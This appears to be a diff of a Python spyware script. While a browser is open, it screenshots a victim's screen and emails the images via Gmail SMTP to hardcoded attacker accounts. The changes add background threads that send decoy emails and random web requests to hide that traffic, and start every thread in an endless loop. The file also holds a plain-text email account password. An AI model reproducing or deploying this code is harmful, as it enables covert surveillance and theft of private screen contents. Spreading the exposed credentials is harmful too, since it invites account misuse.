@@ -18,14 +18,15 @@ import requests
 from threading import Thread
 
 
-time_interval_screen = 5 # random.randint(10, 30)
-time_interval_noise_mail = random.randint(15,20)
+time_interval_screen = random.randint(10, 30)
+time_interval_noise_mail =  random.randint(15,20)
 time_web_noise = random.randint(10, 15)
 smpt_server = 'smtp.gmail.com'
 smtp_port = 465
 smtp_acct = 'becyp2137@gmail.com'
 smtp_password = 'SlavaUkrainie69'
-tgt_accts = ['becyp2137@gmail.com', 'becyp69@op.pl'] # ta lista może być zmienna
+tgt_accts = ['becyp2137@gmail.com'] # ta lista może być zmienna
+noise_mails = ['becyp69@op.pl']
 now = datetime.now() # current date and time
 
 # getting the size of screen, a victim can have multiple monito
@@ -81,7 +82,6 @@ def screenshot_email(subject):
 
     msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
     mailobj.send_message(msg)
-    print("dupa")
     sleep(time_interval_screen)
     mailobj.quit()
 
@@ -99,40 +99,22 @@ def process_exists(process_name = "chrome.exe"):
 
 def noise():
     web_addr = websites[random.randint(0,1000)]
-    print(requests.get(web_addr))
+    try:
+        print(requests.get(web_addr))
+    except Exception as ex:
+        print(ex)
+    
 
-def plain_email():
+def plain_email(subject):
     mailobj = smtplib.SMTP('smtp.gmail.com',587)
     mailobj.ehlo()
     mailobj.starttls()
     mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
-    msg = f"Subject: {websites[random.randint(0,1000)]} \n\n {websites[random.randint(0,1000)]}"
-    print(msg)
-    mailobj.sendmail(smtp_acct, smtp_acct, msg)
+    msg = f"Subject: {subject} \n\n {subject}"
+    mailobj.sendmail(smtp_acct, 'becyp69@op.pl', msg)
+    print("plain mail send")
     mailobj.quit()
 
-if __name__ == '__main__':
-    
-    """
-    t = threading.Thread(target=screenshot)
-    t.start()
-    """
-   
-    """
-    now = datetime.now() # current date and time
-    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-    if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-        screenshot_email(date_time, date_time)
-        print(f"message send: {now}")
-    sleep(time_interval_screen)
-    """
-
-
-
-
-
-from threading import Thread
-import time
 class Screenshot(Thread):
     def __init__(self):
         Thread.__init__(self)
@@ -145,7 +127,20 @@ class Screenshot(Thread):
             if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
                 screenshot_email(date_time)
                 print(f"message send: {now}")
-            time.sleep(time_interval_screen)
+            sleep(time_interval_screen)
+
+class Plainmain(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+        self.daemon = True
+        self.start()
+    def run(self):
+        while True:
+            now = datetime.now() # current date and time
+            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+            plain_email(date_time)
+            sleep(time_interval_noise_mail)
+
 
 class Noise(Thread):
     def __init__(self):
@@ -155,24 +150,15 @@ class Noise(Thread):
     def run(self):
         while True:
             noise()
-            time.sleep(time_web_noise)
-
-class Plainmail(Thread):
-    def __init__(self):
-        Thread.__init__(self)
-        self.daemon = True
-        self.start()
-    def run(self):
-        while True:
-            now = datetime.now() # current date and time
-            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-            if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-                screenshot_email(date_time, date_time)
-                print(f"message send: {now}")
-            time.sleep(time_interval_screen)
+            sleep(time_web_noise)
 
 
-myClassA()
-myClassB()
-while True:
-    pass
+
+
+
+if __name__ == '__main__':
+    Screenshot()
+    Noise()
+    Plainmain()
+    while True:
+        pass
